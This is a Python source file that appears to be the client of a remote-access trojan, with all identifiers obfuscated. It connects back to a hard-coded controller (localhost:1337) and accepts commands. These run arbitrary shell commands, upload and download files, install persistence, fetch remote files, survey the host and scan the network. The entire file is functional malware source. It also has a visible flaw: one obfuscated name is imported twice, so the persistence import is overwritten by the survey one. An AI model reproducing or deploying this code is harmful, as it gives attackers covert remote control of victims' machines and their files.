#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import JwCsVFlvwSXxzwZKpzKYaxboNPDvwiug, atPheiSoAtFBPAPiSWphKMBoMpifCYtC, VxWgDmRXKUkHaoZGUVlfsqoqGmMDDtWS
    from core.filesock import KbuhTZtIvVSBvshIvIaoAxspIPzFrRTF, uNZFEeimqaxXIxuHxoqgUngTOwwhLTrZ
    from core.persistence import YdhlSQqGKFFyGZFIAPpNBTrabuGpkckg
    from core.scan import qNmYcqkdDwIyTmsloXpVvavKuztOpfDt
    from core.survey import YdhlSQqGKFFyGZFIAPpNBTrabuGpkckg
    from core.toolkit import AMDsKcNbycBNHxPhqStxinNymdVWAXZv, LlROorMFrfkrVzxGoecinHGGiVJxsTUb
except ImportError as TlyLZGCjMyfkGQXgBRNEjBhFzbBqaMZP:
    print(TlyLZGCjMyfkGQXgBRNEjBhFzbBqaMZP)
    sys.exit(0)
euoFOuPkQSoaAfDSBRumPKxUoLcgfEkI = sys.platform
FMzNVcthJbHrrUEKFrlcGNricuLgkFfc      = 'localhost'
irAYOKfYwoWgGQZsbMEkibUKxWCYRNoD      = 1337
lfnJteDWQMeRDlqkHzcmwQtnNbocIbdO    = 'b14ce95fa4c33ac2803782d18341869f'
def CxwkuaYxAsqyzyRZGAgajIPQUXTcbOKw():
    CbHagqpBcIpeEWUyuBbobjCzudqKrPsR = socket.socket()
    CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.connect((FMzNVcthJbHrrUEKFrlcGNricuLgkFfc, irAYOKfYwoWgGQZsbMEkibUKxWCYRNoD))
    uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk = VxWgDmRXKUkHaoZGUVlfsqoqGmMDDtWS(CbHagqpBcIpeEWUyuBbobjCzudqKrPsR)
    while True:
        EvLhoaySGAIkzpIVElnpdexKCkkVKLVb = CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.recv(1024)
        EvLhoaySGAIkzpIVElnpdexKCkkVKLVb = JwCsVFlvwSXxzwZKpzKYaxboNPDvwiug(EvLhoaySGAIkzpIVElnpdexKCkkVKLVb, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk)
        WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa, _, MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf = EvLhoaySGAIkzpIVElnpdexKCkkVKLVb.partition(' ')
        if WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'quit':
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.close()
            sys.exit(0)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'run':
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = subprocess.Popen(MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = YMGyjOPytDADCtQTHlvArJaBXhupfTQS.stdout.read() + YMGyjOPytDADCtQTHlvArJaBXhupfTQS.stderr.read()
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.sendall(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(YMGyjOPytDADCtQTHlvArJaBXhupfTQS, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'download':
            for EaleibjntEwBrEGEpOACJgDqRDRDdRnP in MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf.split():
                EaleibjntEwBrEGEpOACJgDqRDRDdRnP = EaleibjntEwBrEGEpOACJgDqRDRDdRnP.strip()
                uNZFEeimqaxXIxuHxoqgUngTOwwhLTrZ(CbHagqpBcIpeEWUyuBbobjCzudqKrPsR, EaleibjntEwBrEGEpOACJgDqRDRDdRnP, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'upload':
            for EaleibjntEwBrEGEpOACJgDqRDRDdRnP in MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf.split():
                EaleibjntEwBrEGEpOACJgDqRDRDdRnP = EaleibjntEwBrEGEpOACJgDqRDRDdRnP.strip()
                KbuhTZtIvVSBvshIvIaoAxspIPzFrRTF(CbHagqpBcIpeEWUyuBbobjCzudqKrPsR, EaleibjntEwBrEGEpOACJgDqRDRDdRnP, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'rekey':
            uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk = VxWgDmRXKUkHaoZGUVlfsqoqGmMDDtWS(CbHagqpBcIpeEWUyuBbobjCzudqKrPsR)
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'persistence':
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = YdhlSQqGKFFyGZFIAPpNBTrabuGpkckg(euoFOuPkQSoaAfDSBRumPKxUoLcgfEkI)
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.send(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(YMGyjOPytDADCtQTHlvArJaBXhupfTQS, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'wget':
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = AMDsKcNbycBNHxPhqStxinNymdVWAXZv(MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf)
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.send(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(YMGyjOPytDADCtQTHlvArJaBXhupfTQS, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'unzip':
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = LlROorMFrfkrVzxGoecinHGGiVJxsTUb(MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf)
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.send(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(YMGyjOPytDADCtQTHlvArJaBXhupfTQS, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'survey':
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = YdhlSQqGKFFyGZFIAPpNBTrabuGpkckg(euoFOuPkQSoaAfDSBRumPKxUoLcgfEkI)
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.send(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(YMGyjOPytDADCtQTHlvArJaBXhupfTQS, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
        elif WoCuDsjrJqkBtrVSNvPIXnePXoPTYVaa == 'scan':
            YMGyjOPytDADCtQTHlvArJaBXhupfTQS = qNmYcqkdDwIyTmsloXpVvavKuztOpfDt(MbYRjLcfsjWAuINTJevWTdDSCsNvjQFf)
            CbHagqpBcIpeEWUyuBbobjCzudqKrPsR.send(atPheiSoAtFBPAPiSWphKMBoMpifCYtC(YMGyjOPytDADCtQTHlvArJaBXhupfTQS, uFmdOymcMMeyJWWaNAHNrjHsxxQEDFtk))
if __name__ == '__main__':
    CxwkuaYxAsqyzyRZGAgajIPQUXTcbOKw()
